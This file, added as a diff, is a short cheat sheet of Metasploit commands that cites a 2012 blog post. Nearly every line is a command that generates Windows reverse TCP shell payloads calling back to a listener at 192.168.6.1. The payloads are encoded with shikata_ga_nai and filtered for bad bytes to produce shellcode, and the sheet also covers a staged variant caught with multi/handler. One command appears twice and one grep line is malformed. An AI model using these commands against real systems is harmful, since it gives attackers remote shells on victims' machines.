@@ -1,0 +1,24 @@
+
+
+
+
+http://it-ovid.blogspot.com/2012/02/metasploit-and-meterpreter.html
+
+Metasploit Framework - Payload Encoding
+List all available payloads and search for windows reverse tcp shellsmsfpayload -l | grep windows | grep shell | grep reverse | tcp
+
+List available encoders 
+msfencode -l 
+
+Reverse self-contained (not staged) command shell: 341 bytes 
+msfpayload windows/shell_reverse_tcp LHOST=192.168.6.1 R | msfencode -e x86/shikata_ga_nai -b '\x00\x0a\x0b\x0d\x90' -t c
+
+msfpayload windows/shell_reverse_tcp LHOST=192.168.6.1 R | msfencode -e x86/shikata_ga_nai -b '\x00\x0a\x0b\x0d\x90' -t c
+
+Windows Command Shell, reverse Ordinal TCP Stager (Np NX or Win7) 
+Use msf multi/handler to listen and upload remainder of the shellcode (stage 2)
+
+msfpayload windows/shell/reverse_ord_tcp LHOST=192.168.6.1 R | msfencode -e x86/shikata_ga_nai -b '\x00\x0a\x0b\x0d\x90' -t c
+Generic Syntax
+
+msfpayload <payload> <options> <output>| ./msfencode -e <encoder> -b <bad bytes> -t <output format>
